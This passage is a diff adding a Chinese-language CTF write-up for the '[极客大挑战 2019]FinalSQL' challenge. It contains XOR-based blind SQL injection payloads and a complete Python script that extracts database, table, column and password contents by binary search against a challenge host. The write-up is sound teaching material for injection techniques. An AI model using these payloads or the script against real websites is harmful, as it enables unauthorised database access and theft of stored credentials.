@@ -271,5 +271,211 @@ XPATH syntax error: '~79-8b57-445e-9604-715dea2ce70d}'
 
 flag{c526d579-8b57-445e-9604-715dea2ce70d}
 
+大功告成！
 
+## [极客大挑战 2019]FinalSQL
+
+![alt text](image-4.png)
+
+终于来到最终版本，首先是界面上多了5个按钮，依次按过去显然是拿不到flag的，大概只是作者的一点小幽默。
+
+先测bs过滤：
+
+结果非常的amazing，居然整个字典里的东西全部给我按HardSQL里的方法强制过滤了，那我还玩啥了我请问呢...
+
+（哦其实除了from关键字没有被过滤
+
+不过其实我们还有一个注入点！那就是前面的5个按钮！其传入了一个id参数！
+
+对id测过滤，这些符号/关键字被过滤：
+
+! * & % # @ + % | --+ /**/ && || and if union by like rlike limit mid handler
+
+在union,or,and都被完全过滤的前提下，我们可以考虑异或注入
+
+?id=1^(length(database())=4)^1
+
+因为%被过滤了所以结尾就不加%23了
+
+可以看到返回的相当于是id=1的页面！所以这也就意味着length(database())=4是True！
+
+得到了数据库名字的长度之后，用盲注的方法脚本爆破：
+
+值得注意的是如果尝试用error-type注入会直接回显'Error!'，这条路也被堵死了
+
+```python
+import requests
+import sys
+import time
+
+def get_DBlen(url):
+    for i in range(1, 21):
+        db_url = url + f"?id=1^(length(database())={str(i)})^1"
+        r = requests.get(db_url)
+        if "Click" in r.text:
+            return i
+    return -1
+
+def get_DBname(url, length):
+    DBname=""
+    for i in range(1, length + 1):
+        max = 122
+        min = 41 # All Common ASCII characters 
+        while min < max:
+            mid = (min + max) >> 1
+            db_url = url + f"?id=1^(ascii(substr(database(),{str(i)},1))>{str(mid)})^1"
+            r = requests.get(db_url)
+            if "Click" in r.text:
+                min = mid + 1
+            else:
+                max = mid       
+        mid = min
+        DBname += chr(mid)
+    return DBname
+
+def get_TBlen(url):
+    for i in range(1, 100):
+        db_url = url + f"?id=1^(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'))={str(i)})^1"
+#        print(db_url)
+        r = requests.get(db_url)
+        if "Click" in r.text:
+            return i
+    return -1
+
+def get_TBname(url, length):
+    tbname = ""
+    for i in range(1, length + 1):
+        min = 41
+        max = 122
+        while min < max:
+            mid = (min + max) >> 1
+            db_url = url + f"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),{str(i)},1))>{str(mid)})^1"
+            r = requests.get(db_url)
+            if "Click" in r.text:
+                min = mid + 1
+            else:
+                max = mid
+        mid = min
+        tbname += chr(mid)
+    return tbname
+
+def get_CLlen(url):
+    for i in range(1, 100):
+        cl_url = url + f"?id=1^(length((select(group_concat(column_name))from(information_schema.columns)where(table_name)='F1naI1y'))={str(i)})^1"
+#        print(db_url)
+        r = requests.get(cl_url)
+        if "Click" in r.text:
+            return i
+    return -1
+
+def get_CLname(url, length):
+    clname = ""
+    for i in range(1, length + 1):
+        min = 41
+        max = 122
+        while min < max:
+            mid = (min + max) >> 1
+            cl_url = url + f"?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='F1naI1y'),{str(i)},1))>{str(mid)})^1"
+            r = requests.get(cl_url)
+            if "Click" in r.text:
+                min = mid + 1
+            else:
+                max = mid
+        mid = min
+        clname += chr(mid)
+    return clname
+
+def get_PWlen(url):
+    min = 1
+    max = 1000
+    while min < max:
+        mid = (min + max) >> 1
+        pw_url = url + f"?id=1^(length((select(group_concat(password))from(F1naI1y)))>{str(mid)})^1"
+#        print(db_url)
+        r = requests.get(pw_url)
+        if "Click" in r.text:
+            min = mid + 1
+        elif "Error" in r.text:
+            return -100
+        else:
+            max = mid
+    mid = min
+    return mid
+
+def get_PWname(url, length):
+    pwname = ""
+    for i in range(170, length + 1): # 根据经验也可以只看后面的password
+        min = 41
+        max = 122
+        while min < max:
+            mid = (min + max) >> 1
+            pw_url = url + f"?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),{str(i)},1))>{str(mid)})^1"
+            r = requests.get(pw_url)
+            if "Click" in r.text:
+                min = mid + 1
+            else:
+                max = mid
+        mid = min
+        pwname += chr(mid)
+    return pwname
+
+url = "http://5eb0077d-eb3d-435e-a13e-c2cc2fc0d166.node5.buuoj.cn:81/search.php"
+# db_len = get_DBlen(url)
+# print(f"Database name length: {db_len}")
+
+# db_len = 4
+
+# db_name = get_DBname(url, db_len)
+# print(f"Database name: {db_name}")
+
+# db_name='geek'
+
+# tb_len = get_TBlen(url)
+# print(f"Table names length: {tb_len}")
+
+# tb_len = 16
+
+# tb_name = get_TBname(url, 16)
+# print(f"Table names: {tb_name}")
+
+# tb_name='F1naI1y,Flaaaaag'
+# 猜flag实际上是在前者里面
+
+# cl_Len=get_CLlen(url)
+# print(f"Column names length: {cl_Len}")
+
+# cl_Len = 20
+
+# cl_name = get_CLname(url, 20)
+# print(f"Column names: {cl_name}")
+
+# cl_name="id,username,password"
+
+# pw_len = get_PWlen(url)
+# print(f"Password length: {pw_len}")
+
+# pw_len = 213
+
+pw_name = get_PWname(url, 213)
+print(f"Password: {pw_name}")
+
+# pw_name = d,flagz0a381aba-2c3a-48e5-8098-7bc0e53415baz
+# 这里的z因为我们的min-max范围里没有{}所以就变成最大的z了，手动改过来就可以，下次可以扩大一些范围
+
+# flag{0a381aba-2c3a-48e5-8098-7bc0e53415ba}
+```
+
+其实这个脚本里面前后有相当多的复用（因为懒，所以一直就是按长度-内容的方法来），不过似乎也有无需爆长度直接爆内容的写法，下次可以注意一下。
+
+基本的思路还是一样，利用关键字"Click"来判别即可，最后得到flag：
+
+flag{0a381aba-2c3a-48e5-8098-7bc0e53415ba}
+
+## bbbaaa
+
+至此这一系列的sql注入题全部完成！
+
+这五道题基本上覆盖了常见的sql注入类型，还是很值得多多回顾总结的，而且层层递进，从易到难，对rookie来说确实很友好呢！
+
+ok下班！干饭去了！
 
